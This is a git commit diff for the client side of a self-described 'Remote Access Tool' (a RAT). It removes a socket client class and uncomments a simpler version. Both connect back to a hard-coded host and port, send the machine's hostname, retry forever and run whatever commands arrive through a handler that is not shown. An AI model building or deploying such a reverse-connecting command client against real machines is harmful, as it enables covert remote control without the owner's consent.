67762536551bafda71f8d59c56d08a495285738c
LukasAlstrup <62612573+LukasAlstrup@users.noreply.github.com>
2020-12-06 18:31:31 +0100

    Stable release

--- Slave/client.py
+++ Slave/client.py
@@ -1,6 +1,6 @@
 """
 client.py
-version = 0.001
+version = 0.002
 Remote Access Tool
 Made by Lukas Alstrup
 github.com/LukasAlstrup/rat
@@ -24,161 +24,6 @@ from functions import *
 import signal
 import struct
 
-class Client(object):
-
-    def __init__(self):
-        # self.serverHost = '192.168.1.9'
-        self.serverHost = '192.168.0.14'
-        self.serverPort = 8080
-        self.socket = None
-
-    def register_signal_handler(self):
-        signal.signal(signal.SIGINT, self.quit_gracefully)
-        signal.signal(signal.SIGTERM, self.quit_gracefully)
-        return
-
-    def quit_gracefully(self, signal=None, frame=None):
-        print('\nQuitting gracefully')
-        if self.socket:
-            try:
-                self.socket.shutdown(2)
-                self.socket.close()
-            except Exception as e:
-                print('Could not close connection %s' % str(e))
-                # continue
-        sys.exit(0)
-        return
-
-    def socket_create(self):
-        """ Create a socket """
-        try:
-            self.socket = socket.socket()
-        except socket.error as e:
-            print("Socket creation error" + str(e))
-            return
-        return
-
-    def socket_connect(self):
-        """ Connect to a remote socket """
-        try:
-            self.socket.connect((self.serverHost, self.serverPort))
-        except socket.error as e:
-            print("Socket connection error: " + str(e))
-            time.sleep(5)
-            raise
-        try:
-            self.socket.send(str.encode(socket.gethostname()))
-        except socket.error as e:
-            print("Cannot send hostname to server: " + str(e))
-            raise
-        return
-
-    def receive_commands(self):
-        #Receive command
-        while True:
-            command = self.socket.recv(1024)
-            command = command.decode()
-            check_command(socket,command)
-        self.socket.close()
-        return
-
-
-def main():
-    client = Client()
-    client.register_signal_handler()
-    client.socket_create()
-    while True:
-        try:
-            client.socket_connect()
-        except Exception as e:
-            print("Error on socket connections: %s" %str(e))
-            time.sleep(5)     
-        else:
-            break    
-    #try:
-    client.receive_commands()
-    #except Exception as e:
-    #    print('Error in main: ' + str(e))
-    client.socket.close()
-    return
-
-
-if __name__ == '__main__':
-    while True:
-        main()
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-"""
 #Server
 port = 8080
 host = "192.168.0.14"
@@ -208,8 +53,3 @@ while True:
     command = s.recv(1024)
     command = command.decode()
     check_command(s,command)
-"""
-
-
-
-
